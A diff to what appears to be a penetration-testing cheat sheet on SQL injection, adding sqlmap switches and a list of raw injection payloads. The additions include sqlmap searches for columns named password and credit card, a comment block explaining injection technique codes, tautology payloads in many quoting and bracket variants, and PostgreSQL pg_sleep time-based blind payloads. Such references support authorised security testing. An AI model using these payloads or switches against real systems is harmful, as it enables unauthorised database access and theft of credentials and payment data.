@@ -11,6 +11,29 @@ Useful Switches
 –-crawl=4 (depth of pages to crawl)
 --proxy=http://127.0.0.1:8080
 –identify-waf
+--dbms=mssql|mysql|mysql 4|mysql 5|oracle|pgsql|sqlite|sqlite3|access|firebird|maxdb|sybase|BD2?
+--prefix=?????? - see below
+--suffix=?????? - see below
+-D DatabaseName --search -C password
+--search -C password
+--search -C credit
+--search -C creditcard
+--list-tampers
+
+# SQL injection techniques to use.
+# Valid: a string composed by B, E, U, S, T and Q where:
+# B: Boolean-based blind SQL injection
+# E: Error-based SQL injection
+# U: UNION query SQL injection
+# S: Stacked queries SQL injection
+# T: Time-based blind SQL injection
+# Q: Inline SQL injection
+# Example: ES (means test for error-based and stacked queries SQL
+# injection types only)
+# Default: BEUSTQ (means test for all SQL injection types - recommended)
+tech = BEUSTQ
+
+
 ```
 
 SQLite sample 
@@ -61,6 +84,22 @@ SQLInjection Basic Stuff
 " or ""="
 '%2b(select*from(select(sleep(20)))a)%2b'%bf%27
 '+(select*from(select(sleep(5)))a)+'
+999999 or 1=1 or 1=1
+' or 1=1 or '1'='1
+" or 1=1 or "1"="1
+999999) or 1=1 or (1=1
+') or 1=1 or ('1'='1
+") or 1=1 or ("1"="1
+999999)) or 1=1 or ((1=1
+')) or 1=1 or (('1'='1
+")) or 1=1 or (("1"="1
+999999))) or 1=1 or (((1
+'))) or 1=1 or ((('1'='1
+"))) or 1=1 or ((("1"="1
+(select 99999999 from pg_sleep(15)) as test
+(select 99999999 from pg_sleep(15))
+9999'||(select 99999999 from pg_sleep(15))||'9999
+9999"||(select 99999999 from pg_sleep(15))||"9999
 ```
 Interesting items that can be used to prefix and suffix attacks
 ---------------------
